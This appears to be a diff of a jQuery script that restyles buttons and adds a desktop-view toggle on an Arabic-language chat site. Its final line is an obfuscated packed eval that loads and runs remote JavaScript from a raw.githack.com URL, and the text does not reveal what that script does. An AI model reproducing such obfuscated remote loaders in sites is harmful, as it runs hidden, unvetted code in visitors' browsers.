@@ -78,87 +78,85 @@ $(document).ready(function() {
 
 
 
-$(document).ready(function() {
-    let isDesktopMode = false; // حالة العرض (وضع الكمبيوتر أو الطبيعي)
+<!-- jQuery -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
-    // إضافة زر جديد أسفل تعطيل زيارة البروفايل
+<!-- CSS: تصميم الورقة + ألوان مختلفة -->
+<style>
+.btn-paper {
+    padding: 10px;
+    width: 98%;
+    margin: 6px auto;
+    font-weight: bold;
+    font-family: 'Tahoma', sans-serif;
+    border-radius: 15px 4px 15px 4px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1),
+                0 6px 12px rgba(0,0,0,0.1);
+    text-align: center;
+    transition: all 0.3s ease-in-out;
+    cursor: pointer;
+    border: none;
+    display: block;
+}
+.btn-paper:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+}
+
+/* ألوان دافئة مختلفة */
+.btn-warm-0 { background: linear-gradient(145deg, #FFDAB9, #FFC1A1); color: #333 !important; }
+.btn-warm-1 { background: linear-gradient(145deg, #FAD0C4, #FFD1FF); color: #333 !important; }
+.btn-warm-2 { background: linear-gradient(145deg, #FFF1CC, #FFD699); color: #333 !important; }
+.btn-warm-3 { background: linear-gradient(145deg, #FFEBB7, #FFCA8B); color: #333 !important; }
+.btn-warm-4 { background: linear-gradient(145deg, #FEEBCB, #FFD3A5); color: #333 !important; }
+.btn-warm-5 { background: linear-gradient(145deg, #d35400, #a84300); color: white !important; }
+</style>
+
+<!-- JavaScript -->
+<script>
+$(document).ready(function () {
+    let isDesktopMode = false;
+
+    // إضافة زر الورقة: "عرض سطح المكتب"
     const newButton = $('<label></label>')
-        .text('عرض سطح المكتب')
-        .addClass('label tc border btn label-info fl') // نفس التنسيق
-        .css({
-            'background-color': 'ghostwhite',
-            'color': 'black',
-            'margin': '1px 4px',
-            'padding': '6px',
-            'width': '98%'
-        })
-        .prepend('<span class="fl fa fa-desktop" style="font-family: FontAwesome, sans-serif;"></span> ') // الأيقونة
-        .click(function() {
+        .html('<span class="fl fa fa-desktop" style="margin-right: 6px;"></span>عرض سطح المكتب')
+        .addClass('label fl btn-paper btn-warm-5')
+        .attr('id', 'desktop-mode-btn')
+        .click(function () {
             if (isDesktopMode) {
-                // العودة إلى الوضع الطبيعي
                 $('meta[name="viewport"]').attr('content', 'width=device-width, initial-scale=1.0');
-                $(this).text('عرض سطح المكتب')
-                    .prepend('<span class="fl fa fa-desktop" style="font-family: FontAwesome, sans-serif;"></span> ');
+                $(this).html('<span class="fl fa fa-desktop" style="margin-right: 6px;"></span>عرض سطح المكتب');
                 isDesktopMode = false;
                 alert('تم العودة إلى الوضع الطبيعي');
             } else {
-                // التبديل إلى وضع الكمبيوتر
                 $('meta[name="viewport"]').attr('content', 'width=1024');
-                $(this).text('عرض الهاتف')
-                    .prepend('<span class="fl fa fa-mobile" style="font-family: FontAwesome, sans-serif;"></span> ');
+                $(this).html('<span class="fl fa fa-mobile" style="margin-right: 6px;"></span>عرض الهاتف');
                 isDesktopMode = true;
                 alert('تم تحويل العرض إلى وضع الكمبيوتر');
             }
         });
 
-    // إضافة الزر إلى العنصر الموجود
+    // إضافة الزر
     $('#newoption .not_geri').append(newButton);
+
+    // التقاط كل العناصر (label, button, a, div...) داخل #newoption .not_geri ماعدا زرنا
+    const allItems = $('#newoption .not_geri').children().not('#desktop-mode-btn');
+    
+    // تطبيق التنسيقات على أول 5 عناصر فقط
+    allItems.each(function(index) {
+        if (index < 5) {
+            $(this).addClass('btn-paper btn-warm-' + index);
+        }
+    });
 });
 
 
 
 
-$("<style>\
-@keyframes sparkle {\
-    0% { background-position: 0% 50%; }\
-    50% { background-position: 100% 50%; }\
-    100% { background-position: 0% 50%; }\
-}\
-.label.uc.fa.fa-microphone.label-danger, \
-.label.label-primary.fa.fa-user.uc {\
-    background-color: transparent !important;\
-    color: transparent !important;\
-    font-weight: bold;\
-    background-image: linear-gradient(90deg, #22516C, #00FFFF, #FFD700, #22516C);\
-    background-size: 400% 400%;\
-    -webkit-background-clip: text;\
-    animation: sparkle 3s ease-in-out infinite;\
-    border: none !important;\
-    font-size: 16px !important;\
-}\
-</style>").appendTo("head");
 
 
 
-$("<style>\
-@keyframes sparkle {\
-    0% { background-position: 0% 50%; }\
-    50% { background-position: 100% 50%; }\
-    100% { background-position: 0% 50%; }\
-}\
-.u-topic.dots.flex-grow-1:not([style*='color: transparent']) {\
-    color: transparent !important;\
-    padding-left: 2px !important;\
-    font-size: 15px !important;\
-    font-weight: bold !important;\
-    letter-spacing: 1px;\
-    text-transform: uppercase;\
-    background-image: linear-gradient(90deg, #22516C, #00FFFF, #FFD700, #22516C);\
-    background-size: 400% 400%;\
-    -webkit-background-clip: text;\
-    animation: sparkle 3s ease-in-out infinite;\
-}\
-</style>").appendTo("head");
+
 
 
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$.0(\'1://2.3.4/5/6/7/8/9/a.b\');',12,12,'getScript|https|raw|githack|com|dimashki98|Java|refs|heads|main|Youtube00|js'.split('|'),0,{}))
